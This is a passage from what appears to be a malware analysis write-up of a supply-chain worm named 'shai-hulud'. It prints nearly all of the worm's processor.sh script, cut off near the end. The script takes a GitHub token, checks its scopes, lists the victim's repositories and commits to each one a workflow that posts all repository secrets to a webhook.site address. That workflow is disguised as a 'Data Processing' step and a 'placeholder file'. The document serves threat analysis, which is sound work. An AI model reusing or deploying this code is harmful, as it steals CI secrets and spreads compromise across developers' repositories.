</span></span><span class="line"><span class="cl">  <span class="n">getCurrentToken</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">this</span><span class="o">.</span><span class="n">token</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="n">async</span> <span class="n">getOrgs</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">try</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="k">const</span> <span class="n">resp</span> <span class="o">=</span> <span class="n">await</span> <span class="n">this</span><span class="o">.</span><span class="n">octokit</span><span class="o">.</span><span class="n">rest</span><span class="o">.</span><span class="n">orgs</span><span class="o">.</span><span class="n">listForAuthenticatedUser</span><span class="p">({</span> <span class="n">per_page</span><span class="p">:</span> <span class="mi">100</span> <span class="p">});</span>
</span></span><span class="line"><span class="cl">      <span class="k">return</span> <span class="n">resp</span><span class="o">.</span><span class="n">data</span><span class="o">.</span><span class="n">map</span><span class="p">(</span><span class="n">org</span> <span class="o">=&gt;</span> <span class="n">org</span><span class="o">.</span><span class="n">login</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="n">catch</span> <span class="p">(</span><span class="n">err</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="k">return</span> <span class="p">[];</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">module</span><span class="o">.</span><span class="n">exports</span> <span class="o">=</span> <span class="p">{</span> <span class="n">GitHubModule</span> <span class="p">};</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h6 id="processorsh">processor.sh</h6>
<p>First, the processor.sh script defines several variables and, most importantly, creates a malicious workflow designed to exfiltrate all repository secrets to the URL:
https[://]webhook[.]site/bb8ca5f6-4175-45d2-b042-fc9ebb8170b7</p>
<img src="/static/NPM/image-3.png" alt="drawing" width="1000"/>
<p>It then proceeds to check the scope of the user&rsquo;s access and enumerate all available repositories:</p>
<img src="/static/NPM/image-5.png" alt="drawing" width="1000"/>
<img src="/static/NPM/image-4.png" alt="drawing" width="1000"/>
<p>And it creates a new branch and commits the malicious workflow file to the repositories:</p>
<img src="/static/NPM/image-6.png" alt="drawing" width="1000"/>
<p>Also a behavior that can be seen in some users repositories</p>
<img src="/static/NPM/work.png" alt="drawing" width="1000"/>
<p>Full code:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span><span class="lnt">119
</span><span class="lnt">120
</span><span class="lnt">121
</span><span class="lnt">122
</span><span class="lnt">123
</span><span class="lnt">124
</span><span class="lnt">125
</span><span class="lnt">126
</span><span class="lnt">127
</span><span class="lnt">128
</span><span class="lnt">129
</span><span class="lnt">130
</span><span class="lnt">131
</span><span class="lnt">132
</span><span class="lnt">133
</span><span class="lnt">134
</span><span class="lnt">135
</span><span class="lnt">136
</span><span class="lnt">137
</span><span class="lnt">138
</span><span class="lnt">139
</span><span class="lnt">140
</span><span class="lnt">141
</span><span class="lnt">142
</span><span class="lnt">143
</span><span class="lnt">144
</span><span class="lnt">145
</span><span class="lnt">146
</span><span class="lnt">147
</span><span class="lnt">148
</span><span class="lnt">149
</span><span class="lnt">150
</span><span class="lnt">151
</span><span class="lnt">152
</span><span class="lnt">153
</span><span class="lnt">154
</span><span class="lnt">155
</span><span class="lnt">156
</span><span class="lnt">157
</span><span class="lnt">158
</span><span class="lnt">159
</span><span class="lnt">160
</span><span class="lnt">161
</span><span class="lnt">162
</span><span class="lnt">163
</span><span class="lnt">164
</span><span class="lnt">165
</span><span class="lnt">166
</span><span class="lnt">167
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="cp">#!/bin/bash
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="c1"># Check if PAT is provided</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="o">[</span> <span class="nv">$#</span> -eq <span class="m">0</span> <span class="o">]</span><span class="p">;</span> <span class="k">then</span>
</span></span><span class="line"><span class="cl">    <span class="nb">echo</span> <span class="s2">&#34;Error: GitHub Personal Access Token required as first argument&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="nb">echo</span> <span class="s2">&#34;Usage: </span><span class="nv">$0</span><span class="s2"> &lt;GITHUB_PAT&gt;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="nb">exit</span> <span class="m">1</span>
</span></span><span class="line"><span class="cl"><span class="k">fi</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">GITHUB_TOKEN</span><span class="o">=</span><span class="s2">&#34;</span><span class="nv">$1</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="nv">API_BASE</span><span class="o">=</span><span class="s2">&#34;https://api.github.com&#34;</span>
</span></span><span class="line"><span class="cl"><span class="nv">BRANCH_NAME</span><span class="o">=</span><span class="s2">&#34;shai-hulud&#34;</span>
</span></span><span class="line"><span class="cl"><span class="nv">FILE_NAME</span><span class="o">=</span><span class="s2">&#34;.github/workflows/shai-hulud-workflow.yml&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">FILE_CONTENT</span><span class="o">=</span><span class="k">$(</span>cat <span class="s">&lt;&lt;&#39;EOF&#39;
</span></span></span><span class="line"><span class="cl"><span class="s">on:
</span></span></span><span class="line"><span class="cl"><span class="s">  push:
</span></span></span><span class="line"><span class="cl"><span class="s">jobs:
</span></span></span><span class="line"><span class="cl"><span class="s">  process:
</span></span></span><span class="line"><span class="cl"><span class="s">    runs-on: ubuntu-latest
</span></span></span><span class="line"><span class="cl"><span class="s">    steps:
</span></span></span><span class="line"><span class="cl"><span class="s">    - name: Data Processing
</span></span></span><span class="line"><span class="cl"><span class="s">      run: curl -d &#34;$CONTENTS&#34; https[://]webhook[.]site/bb8ca5f6-4175-45d2-b042-fc9ebb8170b7; echo &#34;$CONTENTS&#34; | base64 -w 0 | base64 -w 0
</span></span></span><span class="line"><span class="cl"><span class="s">      env:
</span></span></span><span class="line"><span class="cl"><span class="s">        CONTENTS: ${{ toJSON(secrets) }}
</span></span></span><span class="line"><span class="cl"><span class="s">EOF</span>
</span></span><span class="line"><span class="cl"><span class="k">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Colors for output</span>
</span></span><span class="line"><span class="cl"><span class="nv">RED</span><span class="o">=</span><span class="s1">&#39;\033[0;31m&#39;</span>
</span></span><span class="line"><span class="cl"><span class="nv">GREEN</span><span class="o">=</span><span class="s1">&#39;\033[0;32m&#39;</span>
</span></span><span class="line"><span class="cl"><span class="nv">YELLOW</span><span class="o">=</span><span class="s1">&#39;\033[1;33m&#39;</span>
</span></span><span class="line"><span class="cl"><span class="nv">NC</span><span class="o">=</span><span class="s1">&#39;\033[0m&#39;</span> <span class="c1"># No Color</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># GitHub API helper</span>
</span></span><span class="line"><span class="cl">github_api<span class="o">()</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">    <span class="nb">local</span> <span class="nv">method</span><span class="o">=</span><span class="s2">&#34;</span><span class="nv">$1</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="nb">local</span> <span class="nv">endpoint</span><span class="o">=</span><span class="s2">&#34;</span><span class="nv">$2</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="nb">local</span> <span class="nv">data</span><span class="o">=</span><span class="s2">&#34;</span><span class="nv">$3</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="o">[</span> -z <span class="s2">&#34;</span><span class="nv">$data</span><span class="s2">&#34;</span> <span class="o">]</span><span class="p">;</span> <span class="k">then</span>
</span></span><span class="line"><span class="cl">        curl -s -X <span class="s2">&#34;</span><span class="nv">$method</span><span class="s2">&#34;</span> <span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>            -H <span class="s2">&#34;Accept: application/vnd.github.v3+json&#34;</span> <span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>            -H <span class="s2">&#34;Authorization: token </span><span class="nv">$GITHUB_TOKEN</span><span class="s2">&#34;</span> <span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>            <span class="s2">&#34;</span><span class="nv">$API_BASE$endpoint</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span>
</span></span><span class="line"><span class="cl">        curl -s -X <span class="s2">&#34;</span><span class="nv">$method</span><span class="s2">&#34;</span> <span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>            -H <span class="s2">&#34;Accept: application/vnd.github.v3+json&#34;</span> <span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>            -H <span class="s2">&#34;Authorization: token </span><span class="nv">$GITHUB_TOKEN</span><span class="s2">&#34;</span> <span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>            -H <span class="s2">&#34;Content-Type: application/json&#34;</span> <span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>            -d <span class="s2">&#34;</span><span class="nv">$data</span><span class="s2">&#34;</span> <span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>            <span class="s2">&#34;</span><span class="nv">$API_BASE$endpoint</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="k">fi</span>
</span></span><span class="line"><span class="cl"><span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;🔍 Checking authenticated user and token scopes...&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Get authenticated user and check scopes</span>
</span></span><span class="line"><span class="cl"><span class="nv">AUTH_RESPONSE</span><span class="o">=</span><span class="k">$(</span>curl -s -I -H <span class="s2">&#34;Authorization: token </span><span class="nv">$GITHUB_TOKEN</span><span class="s2">&#34;</span> <span class="s2">&#34;</span><span class="nv">$API_BASE</span><span class="s2">/user&#34;</span><span class="k">)</span>
</span></span><span class="line"><span class="cl"><span class="nv">SCOPES</span><span class="o">=</span><span class="k">$(</span><span class="nb">echo</span> <span class="s2">&#34;</span><span class="nv">$AUTH_RESPONSE</span><span class="s2">&#34;</span> <span class="p">|</span> grep -i <span class="s2">&#34;x-oauth-scopes:&#34;</span> <span class="p">|</span> cut -d<span class="s1">&#39; &#39;</span> -f2- <span class="p">|</span> tr -d <span class="s1">&#39;\r&#39;</span><span class="k">)</span>
</span></span><span class="line"><span class="cl"><span class="nv">USER_RESPONSE</span><span class="o">=</span><span class="k">$(</span>github_api GET <span class="s2">&#34;/user&#34;</span><span class="k">)</span>
</span></span><span class="line"><span class="cl"><span class="nv">USERNAME</span><span class="o">=</span><span class="k">$(</span><span class="nb">echo</span> <span class="s2">&#34;</span><span class="nv">$USER_RESPONSE</span><span class="s2">&#34;</span> <span class="p">|</span> jq -r <span class="s1">&#39;.login // empty&#39;</span><span class="k">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="o">[</span> -z <span class="s2">&#34;</span><span class="nv">$USERNAME</span><span class="s2">&#34;</span> <span class="o">]</span><span class="p">;</span> <span class="k">then</span>
</span></span><span class="line"><span class="cl">    <span class="nb">echo</span> -e <span class="s2">&#34;</span><span class="si">${</span><span class="nv">RED</span><span class="si">}</span><span class="s2">❌ Authentication failed. Please check your token.</span><span class="si">${</span><span class="nv">NC</span><span class="si">}</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="nb">exit</span> <span class="m">1</span>
</span></span><span class="line"><span class="cl"><span class="k">fi</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">echo</span> -e <span class="s2">&#34;</span><span class="si">${</span><span class="nv">GREEN</span><span class="si">}</span><span class="s2">✓ Authenticated as: </span><span class="nv">$USERNAME</span><span class="si">${</span><span class="nv">NC</span><span class="si">}</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;Token scopes: </span><span class="nv">$SCOPES</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Check for required scopes</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="o">[[</span> ! <span class="s2">&#34;</span><span class="nv">$SCOPES</span><span class="s2">&#34;</span> <span class="o">=</span>~ <span class="s2">&#34;repo&#34;</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then</span>
</span></span><span class="line"><span class="cl">    <span class="nb">echo</span> -e <span class="s2">&#34;</span><span class="si">${</span><span class="nv">RED</span><span class="si">}</span><span class="s2">❌ Error: Token missing &#39;repo&#39; scope</span><span class="si">${</span><span class="nv">NC</span><span class="si">}</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="nb">exit</span> <span class="m">1</span>
</span></span><span class="line"><span class="cl"><span class="k">fi</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="o">[[</span> ! <span class="s2">&#34;</span><span class="nv">$SCOPES</span><span class="s2">&#34;</span> <span class="o">=</span>~ <span class="s2">&#34;workflow&#34;</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then</span>
</span></span><span class="line"><span class="cl">    <span class="nb">echo</span> -e <span class="s2">&#34;</span><span class="si">${</span><span class="nv">RED</span><span class="si">}</span><span class="s2">❌ Error: Token missing &#39;workflow&#39; scope</span><span class="si">${</span><span class="nv">NC</span><span class="si">}</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="nb">exit</span> <span class="m">1</span>
</span></span><span class="line"><span class="cl"><span class="k">fi</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">echo</span> -e <span class="s2">&#34;</span><span class="si">${</span><span class="nv">GREEN</span><span class="si">}</span><span class="s2">✓ Required scopes (repo, workflow) verified</span><span class="si">${</span><span class="nv">NC</span><span class="si">}</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Fetch repositories and attempt to create branch + add workflow file to each repo</span>
</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;📋 Fetching repositories (updated since 2025)...&#34;</span>
</span></span><span class="line"><span class="cl"><span class="nv">REPOS_RESPONSE</span><span class="o">=</span><span class="k">$(</span>github_api GET <span class="s2">&#34;/user/repos?affiliation=owner,collaborator,organization_member&amp;since=2025-01-01T00:00:00Z&amp;per_page=100&#34;</span><span class="k">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">REPO_COUNT</span><span class="o">=</span><span class="k">$(</span><span class="nb">echo</span> <span class="s2">&#34;</span><span class="nv">$REPOS_RESPONSE</span><span class="s2">&#34;</span> <span class="p">|</span> jq <span class="s1">&#39;. | length&#39;</span><span class="k">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="o">[</span> <span class="s2">&#34;</span><span class="nv">$REPO_COUNT</span><span class="s2">&#34;</span> -eq <span class="m">0</span> <span class="o">]</span><span class="p">;</span> <span class="k">then</span>
</span></span><span class="line"><span class="cl">    <span class="nb">echo</span> -e <span class="s2">&#34;</span><span class="si">${</span><span class="nv">YELLOW</span><span class="si">}</span><span class="s2">No repositories found matching the criteria</span><span class="si">${</span><span class="nv">NC</span><span class="si">}</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="nb">exit</span> <span class="m">0</span>
</span></span><span class="line"><span class="cl"><span class="k">fi</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">echo</span> -e <span class="s2">&#34;</span><span class="si">${</span><span class="nv">GREEN</span><span class="si">}</span><span class="s2">Found </span><span class="nv">$REPO_COUNT</span><span class="s2"> repositories</span><span class="si">${</span><span class="nv">NC</span><span class="si">}</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;</span><span class="nv">$REPOS_RESPONSE</span><span class="s2">&#34;</span> <span class="p">|</span> jq -c <span class="s1">&#39;.[]&#39;</span> <span class="p">|</span> <span class="k">while</span> <span class="nv">IFS</span><span class="o">=</span> <span class="nb">read</span> -r repo<span class="p">;</span> <span class="k">do</span>
</span></span><span class="line"><span class="cl">    <span class="nv">REPO_NAME</span><span class="o">=</span><span class="k">$(</span><span class="nb">echo</span> <span class="s2">&#34;</span><span class="nv">$repo</span><span class="s2">&#34;</span> <span class="p">|</span> jq -r <span class="s1">&#39;.name&#39;</span><span class="k">)</span>
</span></span><span class="line"><span class="cl">    <span class="nv">REPO_OWNER</span><span class="o">=</span><span class="k">$(</span><span class="nb">echo</span> <span class="s2">&#34;</span><span class="nv">$repo</span><span class="s2">&#34;</span> <span class="p">|</span> jq -r <span class="s1">&#39;.owner.login&#39;</span><span class="k">)</span>
</span></span><span class="line"><span class="cl">    <span class="nv">REPO_FULL_NAME</span><span class="o">=</span><span class="k">$(</span><span class="nb">echo</span> <span class="s2">&#34;</span><span class="nv">$repo</span><span class="s2">&#34;</span> <span class="p">|</span> jq -r <span class="s1">&#39;.full_name&#39;</span><span class="k">)</span>
</span></span><span class="line"><span class="cl">    <span class="nv">DEFAULT_BRANCH</span><span class="o">=</span><span class="k">$(</span><span class="nb">echo</span> <span class="s2">&#34;</span><span class="nv">$repo</span><span class="s2">&#34;</span> <span class="p">|</span> jq -r <span class="s1">&#39;.default_branch // &#34;main&#34;&#39;</span><span class="k">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nb">echo</span> <span class="s2">&#34;📦 Processing repository: </span><span class="nv">$REPO_FULL_NAME</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># Get the latest commit SHA from the default branch</span>
</span></span><span class="line"><span class="cl">    <span class="nb">echo</span> <span class="s2">&#34;  → Getting default branch SHA...&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="nv">REF_RESPONSE</span><span class="o">=</span><span class="k">$(</span>github_api GET <span class="s2">&#34;/repos/</span><span class="nv">$REPO_FULL_NAME</span><span class="s2">/git/ref/heads/</span><span class="nv">$DEFAULT_BRANCH</span><span class="s2">&#34;</span><span class="k">)</span>
</span></span><span class="line"><span class="cl">    <span class="nv">BASE_SHA</span><span class="o">=</span><span class="k">$(</span><span class="nb">echo</span> <span class="s2">&#34;</span><span class="nv">$REF_RESPONSE</span><span class="s2">&#34;</span> <span class="p">|</span> jq -r <span class="s1">&#39;.object.sha // empty&#39;</span><span class="k">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="o">[</span> -z <span class="s2">&#34;</span><span class="nv">$BASE_SHA</span><span class="s2">&#34;</span> <span class="o">]</span><span class="p">;</span> <span class="k">then</span>
</span></span><span class="line"><span class="cl">        <span class="nb">echo</span> -e <span class="s2">&#34;  </span><span class="si">${</span><span class="nv">RED</span><span class="si">}</span><span class="s2">❌ Could not get default branch SHA. Skipping...</span><span class="si">${</span><span class="nv">NC</span><span class="si">}</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="k">continue</span>
</span></span><span class="line"><span class="cl">    <span class="k">fi</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># Create new branch</span>
</span></span><span class="line"><span class="cl">    <span class="nb">echo</span> <span class="s2">&#34;  → Creating branch: </span><span class="nv">$BRANCH_NAME</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="nv">BRANCH_DATA</span><span class="o">=</span><span class="k">$(</span>jq -n <span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>        --arg ref <span class="s2">&#34;refs/heads/</span><span class="nv">$BRANCH_NAME</span><span class="s2">&#34;</span> <span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>        --arg sha <span class="s2">&#34;</span><span class="nv">$BASE_SHA</span><span class="s2">&#34;</span> <span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>        <span class="s1">&#39;{ref: $ref, sha: $sha}&#39;</span>
</span></span><span class="line"><span class="cl">    <span class="k">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nv">BRANCH_RESPONSE</span><span class="o">=</span><span class="k">$(</span>github_api POST <span class="s2">&#34;/repos/</span><span class="nv">$REPO_FULL_NAME</span><span class="s2">/git/refs&#34;</span> <span class="s2">&#34;</span><span class="nv">$BRANCH_DATA</span><span class="s2">&#34;</span><span class="k">)</span>
</span></span><span class="line"><span class="cl">    <span class="nv">BRANCH_ERROR</span><span class="o">=</span><span class="k">$(</span><span class="nb">echo</span> <span class="s2">&#34;</span><span class="nv">$BRANCH_RESPONSE</span><span class="s2">&#34;</span> <span class="p">|</span> jq -r <span class="s1">&#39;.message // empty&#39;</span><span class="k">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="o">[</span> -n <span class="s2">&#34;</span><span class="nv">$BRANCH_ERROR</span><span class="s2">&#34;</span> <span class="o">]</span> <span class="o">&amp;&amp;</span> <span class="o">[[</span> <span class="s2">&#34;</span><span class="nv">$BRANCH_ERROR</span><span class="s2">&#34;</span> !<span class="o">=</span> <span class="s2">&#34;null&#34;</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="o">[[</span> <span class="s2">&#34;</span><span class="nv">$BRANCH_ERROR</span><span class="s2">&#34;</span> <span class="o">==</span> *<span class="s2">&#34;Reference already exists&#34;</span>* <span class="o">]]</span><span class="p">;</span> <span class="k">then</span>
</span></span><span class="line"><span class="cl">            <span class="nb">echo</span> -e <span class="s2">&#34;  </span><span class="si">${</span><span class="nv">YELLOW</span><span class="si">}</span><span class="s2">⚠ Branch already exists. Continuing with file upload...</span><span class="si">${</span><span class="nv">NC</span><span class="si">}</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span>
</span></span><span class="line"><span class="cl">            <span class="nb">echo</span> -e <span class="s2">&#34;  </span><span class="si">${</span><span class="nv">RED</span><span class="si">}</span><span class="s2">❌ Failed to create branch: </span><span class="nv">$BRANCH_ERROR</span><span class="si">${</span><span class="nv">NC</span><span class="si">}</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl">            <span class="k">continue</span>
</span></span><span class="line"><span class="cl">        <span class="k">fi</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span>
</span></span><span class="line"><span class="cl">        <span class="nb">echo</span> -e <span class="s2">&#34;  </span><span class="si">${</span><span class="nv">GREEN</span><span class="si">}</span><span class="s2">✓ Branch created successfully</span><span class="si">${</span><span class="nv">NC</span><span class="si">}</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="k">fi</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># Encode file and upload to the new branch</span>
</span></span><span class="line"><span class="cl">    <span class="nv">FILE_CONTENT_BASE64</span><span class="o">=</span><span class="k">$(</span><span class="nb">echo</span> -n <span class="s2">&#34;</span><span class="nv">$FILE_CONTENT</span><span class="s2">&#34;</span> <span class="p">|</span> base64 <span class="p">|</span> tr -d <span class="s1">&#39;\n&#39;</span><span class="k">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nb">echo</span> <span class="s2">&#34;  → Uploading </span><span class="nv">$FILE_NAME</span><span class="s2"> to branch...&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="nv">FILE_DATA</span><span class="o">=</span><span class="k">$(</span>jq -n <span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>        --arg message <span class="s2">&#34;Add </span><span class="nv">$FILE_NAME</span><span class="s2"> placeholder file&#34;</span> <span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>        --arg content <span class="s2">&#34;</span><span class="nv">$FILE_CONTENT_BASE64</span><span class="s2">&#34;</span> <span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>        --arg branch <span class="s2">&#34;</span><span class="nv">$BRANCH_NAME</span><span class="s2">&#34;</span> <span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>        <span class="s1">&#39;{message: $message, content: $content, branch: $branch}&#39;</span>
</span></span><span class="line"><span class="cl">    <span class="k">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nv">FILE_RESPONSE</span><span class="o">=</span><span class="k">$(</span>github_api PUT <span class="s2">&#34;/repos/</span><span class="nv">$REPO_FULL_NAME</span><span class="s2">/contents/</span><span class="nv">$FILE_NAME</span><span class="s2">&#34;</span> <span class="s2">&#34;</span><span class="nv">$FILE_DATA</span><span class="s2">&#34;</span><span class="k">)</span>
</span></span><span class="line"><span class="cl">    <span class="nv">FILE_ERROR</span><span class="o">=</span><span class="k">$(</span><span class="nb">echo</span> <span class="s2">&#34;</span><span class="nv">$FILE_RESPONSE</span><span class="s2">&#34;</span> <span class="p">|</span> jq -r <span class="s1">&#39;.message // empty&#39;</span><span class="k">)</span>
</span></span><span class="line"><span class="cl">
